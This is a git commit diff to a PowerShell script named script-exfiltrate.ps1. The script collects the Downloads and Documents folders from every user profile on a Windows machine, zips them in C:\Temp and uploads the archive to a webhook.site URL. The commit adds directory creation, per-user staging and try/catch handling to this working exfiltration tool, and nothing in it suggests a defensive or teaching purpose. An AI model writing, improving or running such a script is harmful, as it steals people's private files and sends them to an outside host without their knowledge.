f4f565b6185e4f1bfaab1e41848ec31d8d54dfa7
fareedfauzi <56353946+fareedfauzi@users.noreply.github.com>
2023-12-04 16:46:52 +0800

    Update script-exfiltrate.ps1

--- script-exfiltrate.ps1
+++ script-exfiltrate.ps1
@@ -1,19 +1,43 @@
-# Define the destination zip file
-$zipFile = "C:\Temp\UsersData.zip"
+# Create the C:\Temp directory if it doesn't exist
+$tempDir = "C:\Temp"
+if (-not (Test-Path $tempDir -PathType Container)) {
+    New-Item -Path $tempDir -ItemType Directory
+}
 
-# Create a new empty zip file
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[IO.Compression.ZipFile]::CreateFromDirectory("C:\Temp\EmptyFolder", $zipFile)
+# Define the destination zip file
+$zipFile = Join-Path $tempDir "UsersData.zip"
 
 # Loop through each user profile to find the Downloads and Documents folders
 $users = Get-ChildItem "C:\Users" -Directory
 foreach ($user in $users) {
     $downloadsFolder = Join-Path $user.FullName "Downloads"
     $documentsFolder = Join-Path $user.FullName "Documents"
+    
+    # Check if the folders exist before attempting to add them to the zip file
     if ((Test-Path $downloadsFolder) -and (Test-Path $documentsFolder)) {
-        # Add the Downloads and Documents folders to the zip file
-        Compress-Archive -Path $downloadsFolder, $documentsFolder -Update -DestinationPath $zipFile
+        # Create a temporary folder for each user to avoid conflicts
+        $tempUserDir = Join-Path $tempDir $user.Name
+        New-Item -Path $tempUserDir -ItemType Directory
+
+        try {
+            # Copy the Downloads and Documents folders to the temporary folder
+            Get-ChildItem $downloadsFolder | Copy-Item -Destination $tempUserDir -Recurse -Force
+            Get-ChildItem $documentsFolder | Copy-Item -Destination $tempUserDir -Recurse -Force
+        } catch {
+            Write-Host "Error copying files for user $($user.Name): $_"
+        }
     }
 }
 
-(New-Object System.Net.WebClient).UploadFile("https://webhook.site/138caf52-ee90-4162-a0e3-1d6d140a967d",'C:\Temp\UsersData.zip');
+try {
+    # Create a new empty zip file using Compress-Archive
+    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
+
+    # Upload the zip file to the webhook
+    (New-Object System.Net.WebClient).UploadFile("https://webhook.site/138caf52-ee90-4162-a0e3-1d6d140a967d", $zipFile)
+} catch {
+    Write-Host "Error creating or uploading the zip file: $_"
+} finally {
+    # Remove the temporary folder
+    
+}
